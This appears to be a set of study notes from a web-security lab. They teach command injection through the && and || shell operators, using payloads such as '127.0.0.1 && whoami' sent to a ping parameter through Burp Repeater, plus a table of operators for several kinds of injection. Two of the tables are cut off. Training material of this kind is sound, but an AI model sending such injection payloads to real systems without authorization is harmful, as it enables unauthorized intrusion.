![Image](https://images.openai.com/static-rsc-4/UnrLqUzBWyMRUgf4IlZ0q6LNbk8Kg4Xlws3TQfhSAjVYhmabTd2Jih6n8jqzit94Bvkehsp8PPYzHA4kZMEnzH7Xm2cVpYR-sENXUcl4cGVV_NLV1jJIajWWwiZGujQsn1SgLyCNsKe3RYEhAP8y5UE6RO8jB-4WwKNHhmtdDbz3CJHj5GNzF9pzeu9CRsq_?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/aaStV4W8YBww6s_43czVCLPXyXqDDAP32oljz6ITP9CC2zMBFE1bvLWknar745d6rrOdp3nxlUssJ-ka9YM436Gw6CVS8NUY0Up5y2EtlNEXUg8ln9Tpan8bN-hov2V7GtXIz_-o_1m911GTK6cKiclhs3ujVZ4uci7jZ1d_sqnJtzIx6TKW-Cbafv5lpfXC?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/m2RPE0CP98VvLG5C6e4vLaRWc-2yrtYzDtBtxFbzabwF3enDlSdfTdPOjlM8VwAEc0cXFrCA7U-nD-mBBWwM3McGWYkaHIHMPxQDu42Q6Rz_POWF4qqo7PuFbxHoZCZRQ2FvBCLQxl-YRUwJ56s5LVbv_mc2rQvS3VhOsoElmVfT3WTqPvWmxNrsFtNucr7X?purpose=fullsize)

# 

## 1. Introduction

So far, we used the **semicolon (`;`)** to inject an additional command.

Now we will examine other command operators and understand how their behavior differs.

The two important operators covered here are:

```text
&&
||
```

These are especially important because they are **conditional operators**.

Their behavior depends on whether the first command succeeds or fails.

---

# 2. Quick Comparison

Before going into detail:

|Operator|Meaning|Second Command Executes When|
|---|---|---|
|`;`|Command separator|Normally regardless of first command's result|
|`&&`|AND|First command succeeds|
|`||`|

### Memory Trick

```text
&& → SUCCESS → Continue
|| → FAILURE → Continue
```

Think:

> **AND = both need success**

> **OR = try the second when the first fails**

---

# 3. AND Operator — `&&`

The first operator we will test is:

```text
&&
```

The payload becomes:

```text
127.0.0.1 && whoami
```

The resulting command would be:

```bash
ping -c 1 127.0.0.1 && whoami
```

---

# 4. How `&&` Works

The `&&` operator is a conditional command operator.

The second command is executed **only if the first command succeeds**.

Conceptually:

```text
COMMAND_A && COMMAND_B
```

means:

```text
Run COMMAND_A
      │
      ▼
Did COMMAND_A succeed?
      │
   ┌──┴──┐
  YES    NO
   │      │
   ▼      ▼
Run B   Don't run B
```

---

# 5. Testing `&&` Locally

As with previous tests, we first verify the command locally.

```bash
ping -c 1 127.0.0.1 && whoami
```

The first command:

```bash
ping -c 1 127.0.0.1
```

succeeds.

Therefore:

```bash
whoami
```

is executed.

The result contains:

```text
Ping output
+
whoami output
```

For the lab system, `whoami` returns:

```text
21y4d
```

---

# 6. Why Does `whoami` Execute?

The important concept is the **exit status** of the first command.

In Unix/Linux shells:

```text
Exit code 0 = success
Non-zero exit code = failure
```

Because:

```bash
ping -c 1 127.0.0.1
```

successfully completes, it returns:

```text
0
```

Therefore, `&&` allows the next command to execute.

---

# 7. What If We Don't Supply an IP?

This is an important question from the lab.

Consider:

```bash
ping -c 1 && whoami
```

Here, the first command is incomplete because no destination address is supplied.

Therefore, `ping` fails.

Since the first command failed:

```text
COMMAND_A && COMMAND_B
```

does **not** execute `COMMAND_B`.

### Result

```text
ping fails
   ↓
whoami does NOT execute
```

This demonstrates the conditional nature of `&&`.

---

# 8. AND Operator Logic

Remember:

```text
A && B
```

means:

```text
If A succeeds:
    execute B

If A fails:
    do not execute B
```

### Simple Example

```text
Successful command && second command
          ↓
      second executes
```

But:

```text
Failed command && second command
          ↓
      second doesn't execute
```

---

# 9. Using `&&` in the Web Application

We can now take the payload:

```text
127.0.0.1 && whoami
```

and place it into the intercepted HTTP request.

As before:

1. Capture the request.
    
2. Send it to Repeater.
    
3. Modify the relevant parameter.
    
4. URL-encode the payload where appropriate.
    
5. Send the request.
    
6. Analyze the response.
    

The application returns both the expected `ping` output and the `whoami` output.

This confirms that the injected command executed.

---

# 10. OR Operator — `||`

Now we move to:

```text
||
```

The OR operator behaves differently from `&&`.

Its basic structure is:

```text
COMMAND_A || COMMAND_B
```

The second command executes **only if the first command fails**.

---

# 11. OR Operator Logic

The execution flow is:

```text
COMMAND_A
    │
    ▼
Did A fail?
    │
 ┌──┴──┐
YES    NO
 │      │
 ▼      ▼
Run B  Don't run B
```

### Memory Trick

```text
&& → execute B after SUCCESS
|| → execute B after FAILURE
```

---

# 12. Testing the OR Operator

Our first payload is:

```text
127.0.0.1 || whoami
```

The resulting command is:

```bash
ping -c 1 127.0.0.1 || whoami
```

The `ping` command succeeds.

Therefore, the OR condition is already satisfied by the first command.

The shell does **not** need to execute `whoami`.

---

# 13. Why Does `whoami` Not Execute?

The first command returns exit code:

```text
0
```

which indicates success.

For:

```text
A || B
```

if `A` succeeds, the shell does not need `B`.

Therefore:

```text
ping succeeds
      ↓
whoami skipped
```

---

# 14. Intentionally Making the First Command Fail

To demonstrate the OR operator properly, we can construct a command where the first command fails.

Consider:

```bash
ping -c 1 || whoami
```

There is no destination address.

Therefore, `ping` fails with an error similar to:

```text
ping: usage error: Destination address required
```

Because the first command failed, the OR condition causes the second command to execute.

The result includes:

```text
ping error
+
whoami output
```

For the lab:

```text
21y4d
```

is returned by `whoami`.

---

# 15. OR Operator as a Fallback

A useful way to think about `||` is:

> **If the first operation doesn't work, try the second one.**

Conceptually:

```text
COMMAND_A || COMMAND_B
```

means:

```text
Try A
 │
 ├── Success → stop
 │
 └── Failure → try B
```

This makes `||` useful when the original command may fail or when an injection modifies the original command in a way that causes it to fail.

---

# 16. Comparing `&&` and `||`

This is one of the most important parts of the section.

|Expression|If First Command Succeeds|If First Command Fails|
|---|---|---|
|`A && B`|B executes|B does not execute|
|`A||B`|

### Easy Memory Table

```text
          SUCCESS    FAILURE
&&           B         —
||           —         B
```

---

# 17. Why `||` Can Produce a Cleaner Result

Suppose the original command is intentionally made to fail:

```text
ping -c 1
```

Then:

```text
|| whoami
```

can cause the second command to execute.

The result may contain only the output of the injected command rather than the normal successful output.

This can make the result:

- Simpler
    
- Easier to interpret
    
- Less cluttered
    
- More useful for confirming execution
    

The lab demonstrates this using:

```text
|| whoami
```

---

# 18. Important Concept — Exit Codes

Understanding shell exit codes is essential for understanding `&&` and `||`.

Generally:

```text
0       → Success
Non-zero → Failure
```

For example:

```text
COMMAND_A
```

returns an exit status.

Then:

```text
COMMAND_A && COMMAND_B
```

checks whether that status indicates success.

While:

```text
COMMAND_A || COMMAND_B
```

checks whether the first command failed.

---

# 19. Practical Decision Tree

### With `&&`

```text
First command
     │
     ▼
Success?
 ┌───┴───┐
YES     NO
 │       │
 ▼       ▼
Second  Stop
command
```

### With `||`

```text
First command
     │
     ▼
Failed?
 ┌───┴───┐
YES     NO
 │       │
 ▼       ▼
Second  Stop
command
```

---

# 20. Using These Operators Through Burp Suite

The process remains the same as the previous section.

### Step 1

Start with a legitimate request.

```text
127.0.0.1
```

### Step 2

Intercept the request.

### Step 3

Send it to Repeater.

### Step 4

Modify the parameter.

For `&&`:

```text
127.0.0.1 && whoami
```

For `||`:

```text
127.0.0.1 || whoami
```

### Step 5

URL-encode the relevant characters.

### Step 6

Send the request.

### Step 7

Compare the response with the normal baseline.

---

# 21. Why Test Locally First?

The lab repeatedly follows this methodology:

```text
Test locally
     ↓
Confirm shell behavior
     ↓
Send through HTTP request
     ↓
Observe server behavior
```

This is useful because it prevents confusion between:

- Incorrect shell syntax
    
- Incorrect payload construction
    
- HTTP encoding problems
    
- Application behavior
    
- Actual command injection
    

---

# 22. Other Injection Operators

The material also provides a broader list of common operators used in different injection classes.

|Injection Type|Common Operators / Syntax|
|---|---|
|**SQL Injection**|`'` `,` `;` `--` `/* */`|
|**Command Injection**|`;` `&&`|
|**LDAP Injection**|`*` `(` `)` `&` `\|`|
|**XPath Injection**|`'` `or` `and` `not` `substring` `concat` `count`|
|**OS Command Injection**|`;` `&` `\|`|
|**Code Injection**|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|**Directory/File Path Traversal**|`../` `..\\` `%00`|
|**Object Injection**|`;` `&` `\|`|
|**XQuery Injection**|`'` `;` `--` `/* */`|
|**Shellcode Injection**|`\x` `\u` `%u` `%n`|
|**Header Injection**|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|

---

# 23. Important Warning About the Operator Table

The table is **not exhaustive**.

There are many other operators, syntax variations, encodings, and techniques.

The exact behavior depends heavily on the environment.

Factors can include:

- Operating system
    
- Shell
    
- Application framework
    
- Command execution API
    
- Input parsing
    
- Encoding/decoding
    
- Filtering
    
- Application architecture
    

Therefore:

> **Never assume that an operator will behave identically in every environment.**

---

# 24. Different Injection Types

The table demonstrates a broader security concept:

Different interpreters have different syntax.

For example:

```text
SQL query
   ↓
SQL syntax
```

while:

```text
LDAP query
   ↓
LDAP syntax
```

and:

```text
OS command
   ↓
Shell syntax
```

The injection technique depends on the language or interpreter that processes the input.

---

# 25. Direct Command Injection

This module focuses primarily on:

## Direct Command Injection

The general flow is:

```text
User Input
    ↓
System Command
    ↓
Command Execution
    ↓
Command Output
    ↓
Displayed to User
```

The important characteristic is that we can **see the output of the executed command**.

---

# 26. Blind Command Injection

Blind Command Injection is different.

The command may execute, but its output is **not directly returned to us**.

Conceptually:

```text
User Input
    ↓
System Command
    ↓
Command Executes
    ↓
No Direct Output
```

Therefore, additional techniques are required to determine whether execution occurred.

### Difference

|Direct Injection|Blind Injection|
|---|---|
|Command output visible|Command output not directly visible|
|Easier to confirm|Requires additional confirmation techniques|
|This module focuses on it|Covered in advanced material|

---

# 27. Indirect Command Injection

An injection can also be indirect.

Instead of:

```text
User Input → Command
```

the flow could be:

```text
User Input
     ↓
Application
     ↓
Stored/processed value
     ↓
Another component
     ↓
Command execution
```

This makes detection more complicated.

The current module focuses on **direct command injection**, where the input directly enters the system command.

---

# 28. `&&` vs `||` — The Critical Concept

Memorize this:

```text
A && B

Run B ONLY when A succeeds.
```

Whereas:

```text
A || B

Run B ONLY when A fails.
```

### Visual Memory Trick

```text
        FIRST COMMAND
             │
       ┌─────┴─────┐
       │           │
    SUCCESS      FAILURE
       │           │
       ▼           ▼
      &&          ||
       │           │
       ▼           ▼
    RUN B        RUN B
```

---

# 29. Example Comparison

### Case 1 — `&&`

```bash
ping -c 1 127.0.0.1 && whoami
```

`ping` succeeds.

Therefore:

```text
whoami → executes
```

---

### Case 2 — `&&` with failure

```bash
ping -c 1 && whoami
```

`ping` fails.

Therefore:

```text
whoami → does NOT execute
```

---

### Case 3 — `||` with success

```bash
ping -c 1 127.0.0.1 || whoami
```

`ping` succeeds.

Therefore:

```text
whoami → does NOT execute
```

---

### Case 4 — `||` with failure

```bash
ping -c 1 || whoami
```

`ping` fails.

Therefore:

```text
whoami → executes
```

---

# 30. Key Takeaways

### ⭐ `&&`

```text
A && B
```

**B executes if A succeeds.**

---

### ⭐ `||`

```text
A || B
```

**B executes if A fails.**

---

### ⭐ Exit Codes

```text
0       → success
non-zero → failure
```

These exit statuses control the behavior of `&&` and `||`.

---

### ⭐ Testing Locally

Always verify the command behavior locally first when possible.

---

### ⭐ HTTP Testing

Once the shell behavior is understood, test the input through the authorized lab's HTTP request.

---

### ⭐ Front-End Validation

Browser-side validation can be bypassed by sending a custom HTTP request directly to the server.

---

### ⭐ Direct Command Injection

This module focuses on situations where:

```text
Input → Command → Output
```

and the command output is returned to the user.

---

# 31. Quick Revision Card

```text
COMMAND INJECTION OPERATORS
──────────────────────────────

; 
Command separator

&&
Execute second command ONLY
if first command succeeds.

||
Execute second command ONLY
if first command fails.

&
Background/command separator

|
Pipe output between commands


EXIT STATUS
──────────────────────────────

0       = SUCCESS
non-zero = FAILURE


CONDITIONAL LOGIC
──────────────────────────────

A && B
A succeeds → B runs
A fails    → B skipped

A || B
A succeeds → B skipped
A fails    → B runs


DIRECT INJECTION
──────────────────────────────

Input
  ↓
System command
  ↓
Execution
  ↓
Output returned
```

---

# 32. Final Mental Model

The entire section comes down to **conditional execution**:

```text
                 INPUT
                   │
                   ▼
          ORIGINAL COMMAND
                   │
            ┌──────┴──────┐
            │             │
         SUCCESS         FAILURE
            │             │
            ▼             ▼
           &&            ||
            │             │
            ▼             ▼
       SECOND COMMAND  SECOND COMMAND
          EXECUTES        EXECUTES
```

### 🧠 One sentence to remember

> **`&&` runs the next command when the previous command succeeds, while `||` runs the next command when the previous command fails.**

For this module, also remember the bigger picture:

**Front-end validation can be bypassed → custom HTTP request reaches the back end → shell operator changes command execution → visible command output confirms direct command injection.**